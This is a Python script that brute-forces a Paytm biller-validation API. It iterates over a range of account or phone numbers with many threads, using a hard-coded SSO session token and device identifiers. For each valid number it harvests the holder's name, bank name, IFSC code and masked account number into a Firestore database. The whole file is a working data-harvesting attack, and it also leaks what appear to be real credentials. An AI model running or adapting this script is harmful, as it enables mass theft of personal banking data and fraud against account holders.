import requests
import json
from tqdm import tqdm
import random
import concurrent.futures
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore

# Use a service account
cred = credentials.Certificate('lol.json')
firebase_admin.initialize_app(cred)

db = firestore.client()

def send_request(i, collection_name):
    url = "https://digitalproxy.paytm.com/billerservice/auth/v1/validateBiller?channel=ANDROIDAPP&deviceIdentifier=OnePlus-AC2001-271be052df9325b4&playStore=false&osVersion=13&client=androidapp&lang_id=1&language=en&deviceManufacturer=OnePlus&networkType=4G&locale=en-IN&deviceName=AC2001&version=10.22.0&child_site_id=1&site_id=1"
    headers = {
    "Host": "digitalproxy.paytm.com",
    "Accept-Charset": "UTF-8",
    "Sso_token": "eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0..TefiT_1HqGS84hCJ.vR7xnyK3l_7LEJ-bkkjv6DFNUInrx7pCdL2FqIzWUtEUNdWmLi7tpMV6sz1PmyVyTSPp6ZZdEXCRYNBYFoy18CtVhOrSJVB--n2uyhMrLwxzZyymuda0W2-8HPI_AHyyVYAY5oXEZdYGtpANAOrjNgNPwyW92AxpiJZuQ6EZxLrEwWfZ_6QvL_EmwtdZJvGZHeEf8_CjnC3KScEuKxgP-ePkQsYM9n7s41L4f2Dxc0K06eMzEK9xdeVjoDRpBEn0Na6Rv4j18BJkYFIy.OECeh9dmevGkliCFlcMXAw1700",
    "X-App-Rid": "271be052df9325b4:1683475574944:2:26",
    "Accept-Encoding": "gzip, deflate",
    "If-None-Match": 'W/"104-fz0VDzb0ieZnQGOyNWkSJdXMSPM"',
    "Advertising_id": "ab6567db-3ff7-40a8-a7d9-86d5c43fc7f1",
    "User-Agent": "Paytm Release/10.22.0/721076 (net.one97.paytm; source=unknown; integrity=true; auth=true; en-IN; okhttp 4.9.1) Android/13 OnePlus/AC2001 (arm64-v8a; resolution=3.0; cores=8)",
    "Content-Type": "application/json",
    "Content-Length": "108",
}
    random_product_id = str(random.randint(100000000, 999999999))
    data = {
        "productId": random_product_id,
        "paymentMode": "Mobile",
        "categoryId": 262072,
        "billerInfo": {"accountId": str(i)},
    }
    response = requests.post(url, headers=headers, data=json.dumps(data))
    response_data = response.json()
    
    if response_data['code'] == '00' and response_data['status'] == True:
        biller_info = response_data['billerInfo']
        doc_ref = db.collection(collection_name).document()
        doc_ref.set({
            'accountId': biller_info['accountId'],
            'ifscCode': biller_info['ifscCode'],
            'name': biller_info['name'],
            'bankName': biller_info['bankName'],
            'maskedBankAccount': biller_info['maskedBankAccount']
        })
        return True
    else:
        return False

from firebase_admin import firestore, initialize_app

# Initialize your Firebase app

# Get a reference to your Firestore database
db = firestore.client()
def bruteforce_requests(start, end):
    success_count = 0
    fail_count = 0
    
    # Get user input for custom text
    custom_text = input("Sate & Operator: ")

    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_req = {executor.submit(send_request, i, f"{str(start)[:4]} {custom_text}"): i for i in range(start, end+1)}
        progress = tqdm(concurrent.futures.as_completed(future_to_req), total=end-start+1)
        for future in progress:
            result = future.result()
            if result:
                success_count += 1
            else:
                fail_count += 1
            progress.set_description(f"Successful requests: {success_count} | Failed requests: {fail_count}")

    # After all requests, save the data to Firestore
    document_name = f"{str(start)[:4]}  ({success_count}) {custom_text}"
    doc_ref = db.collection('Total Count').document(document_name)
    doc_ref.set({
        'start': start,
        'end': end,
        'total_count': success_count
    })
    print(f"Total count = {document_name}: {success_count}")

# Get start and end numbers from user input
while True:
    start = input("Enter the start number: ")
    end = input("Enter the end number: ")
    if len(start) <= 10 and len(end) <= 10:
        start = int(start)
        end = int(end)
        break
    else:
        print("Please enter numbers with 10 or fewer digits.")

# Call the function with the user input
bruteforce_requests(start, end)
